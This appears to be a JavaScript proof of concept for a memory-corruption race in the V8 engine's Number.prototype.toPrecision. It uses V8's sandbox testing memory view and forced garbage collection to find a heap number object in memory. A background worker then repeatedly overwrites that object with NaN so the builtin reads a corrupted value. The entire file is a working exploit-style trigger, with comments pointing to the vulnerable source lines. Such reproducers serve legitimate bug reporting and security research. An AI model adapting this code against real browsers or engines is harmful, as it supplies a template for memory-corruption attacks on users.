let memory = new DataView(new Sandbox.MemoryView(0, 0x100000000));

const v5 = 0.0123;
const v1 = 4294967297.123;

function corruptInBackground(address) {
    function workerTemplate(address) {
        let memory = new DataView(new Sandbox.MemoryView(0, 0x100000000));
        while (true) {
            memory.setBigUint64(address, 0x000000000000f87fn);
        }
    }
    const workerCode = new Function(
        `(${workerTemplate})(${address})`);
    return new Worker(workerCode, { type: 'function' });
}

gc();
gc();

try {
    v5.toPrecision(v1)
    gc();
    gc();
} catch (e) { }

try {
    v5.toPrecision(v1)
    gc();
    gc();
} catch (e) { }

// We are searching for 0x41f0000000100000 which is float(4294967297) (value of v1).
//
// The found address will be the address of the heap object created at
//   ASSIGN_RETURN_FAILURE_ON_EXCEPTION(isolate, precision, Object::ToInteger(isolate, precision));
//   src/builtins/builtins-number.cc:173
let start_addr = 0x40000;
while (true) {
    let v1 = memory.getUint32(start_addr, true);
    let v2 = memory.getUint32(start_addr + 4, true);
    if (v2 == 0x41f00000 && v1 == 0x00100000) {
        print("found: 0x" + start_addr.toString(16));
        break;
    }
    start_addr += 1;
}

// Now we start a background thread that writes NaN into the double heap object.
// This will eventually cause the instruction below to read NaN
//  double const precision_number = Object::NumberValue(*precision);
//  src/builtins/builtins-number.cc:175
let worker = corruptInBackground(start_addr);

while (1) {
    try {
        gc()
        gc()
        print(v5.toPrecision(v1));
    } catch (e) {
        print(e)
    }
}
